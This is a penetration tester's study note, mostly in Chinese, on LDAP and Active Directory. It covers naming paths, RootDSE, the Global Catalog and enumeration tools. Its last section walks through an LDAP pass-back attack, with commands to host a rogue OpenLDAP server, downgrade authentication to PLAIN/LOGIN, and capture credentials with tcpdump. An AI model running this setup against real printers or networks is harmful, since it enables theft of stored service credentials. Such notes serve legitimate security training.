---
tags:
  - IT/网络
  - 渗透/内网
  - 渗透/信息收集
---

## 概念

Lightweight Directory Access Protocol，轻量级目录访问协议。

LDAP具有简单的树结构，不能像数据库那样具有复杂的结构。由于负载较轻，适合管理系统账户。

- LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。
- 用来访问/操作AD内的对象的协议。AD用[[LDAP#LDAP命名路径|LDAP命名路径]]来表示对象在AD内的位置索引。

1. BindRequest (认证)
	- Bind就是LDAP登陆的意思——[[LDAP#Bind DN|BindDN]]
2. SearchRequest (LDAP搜索)




## 认证流程

![[eb4c5b6b4d3e747145cc635e08bb1768.png]]

就是把用户数据放在LDAP服务器上，通过LDAP服务器上的数据对用户进行认证处理。

实现原理之一：对每一个登陆请求，会发送本地的用户、密码给LDAP服务器，然后在LDAP服务器上进行匹配，然后判断是否可以通过认证。



## LDAP命名路径

LDAP树：  
![[Pasted image 20240816124653.png]]

- sn：surname（姓氏）

### DN（distinguished Name）：标识名称，LDAP完整路径。

DN 有三个属性，分别是：

- DC (Domain Component)：域名组件。DNS域名的每个元素。如“DC=.com”“DC=.panasonic”
- OU (Organizational Unit)：组织单位，最多4级。定义组的策略。是一种容器，理解为文件夹，可以分组、管理其他对象。

- 用于组织和分组条目，以便更好地管理目录。
- 通常用于创建层次结构，如 OU=Users、OU=Groups。
- 通常不直接用于标识具体的实体，而是用于容纳 CN。

- CN (Common Name)：通用名称，即对象的名称。一般为用户名（可以中文）或计算机名

- 通常用于标识具体的实体，如用户、计算机、服务等。
- 在特定 OU 内，CN 应该是唯一的。

#### Bind DN

LDAP的登陆用户。

#### Base DN

LDAPサービスへログインした後、どの OU 配下の情報を扱うかを示すものです。`suffix`とも呼ばれます。

#### RDN

是DN中每一个用逗号分隔的表达式。

---
## 搜索工具

- [[ldapsearch]]
- [[powershell#Get-ADUser]]
- dsquery
- LDP.exe：普通域主机默认没有，需要安装，不过这是微软的工具。在cmd中输入 `ldp` 启动，和 `AD Explorer` 类似
- DirectorySearcher 对象（ #OSCP ）：`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
- [pyldapsearch](https://github.com/fortalice/pyldapsearch)
- [ldeep](https://github.com/franc-pentest/ldeep)

> [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

## 用BloodHound分析结果

1. BloodHound compatible な形式にデータを変換([BOFHound](https://github.com/fortalice/bofhound))
2. BloodHoundにimport
3. BloodHoundで分析：[bloodhound-gui](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html)

---
## RootDSE

> The top of the directory information tree (DIT) on each DSA is the root of the tree.

在每个DSA的DIT的顶端，都会有**一个特殊的条目称为Root DSE**。这个条目包含与DSA有关的特定信息，如支持的LDAP版本、扩展操作、域名信息（`namingContexts`属性）等。

- DSE: DSA-specific entry
- DSA：**Directory System Agent**，它是LDAP目录服务的一个核心组件，负责处理LDAP客户端的请求，并管理目录信息树（DIT）中的数据。

### Search with [[nmap]]

> we should check the nmap output for the [RootDSE](https://www.ibm.com/docs/en/zos/3.1.0?topic=considerations-root-dse) and any potential hostname.

```bash
sudo nmap -Pn --script ldap-rootdse.nse $target_ip
```

### Search with [[ldapsearch]]

![[ldapsearch#RootDSE]]

---


## 全局目录（Global Catalog）

全局目录更新并同步所有 DC 上的目录副本。

> Large networks may have multiple DCs managed by a Global Catalog that updates and synchronizes directory copies across all DCs.

![[Pasted image 20240816125026.png]]

用途：很多时候，用户或应用程序不知道目标对象的 DN 或哪个分区可能包含该对象。全局编录 (GC) 允许用户和应用程序在给定目标对象的一个或多个属性的情况下在 Active Directory 域树中查找对象。






## 安装（Win）

- AD DS的开关命令：`dcpromo`。转换该服务器的角色（域控or成员）
- DC会将自己扮演的角色注册到DNS，以便让其他PC能够通过DNS找到这台DC





## 攻击手法

### LDAP Pass-back Attacks

在如打印机等设备的配置界面，通常预留了凭据——但是密码不可见时，将认证传到我们自己的LDAP服务器。

#### Hosting a Rogue LDAP Server 托管恶意 LDAP 服务器

##### 安装OpenLDAP

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`

##### 安装完后重新配置

`sudo dpkg-reconfigure -p low slapd`

#### 降级验证机制：PLAIN 和 LOGIN

##### 创建配置文件

```
# cat olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

##### 应用配置

`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`

##### 验证配置

```
└─$ ldapsearch -LLL -x -H ldap:// -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```

#### 捕获LDAP验证

`$ sudo tcpdump -SX -i breachad tcp port 389`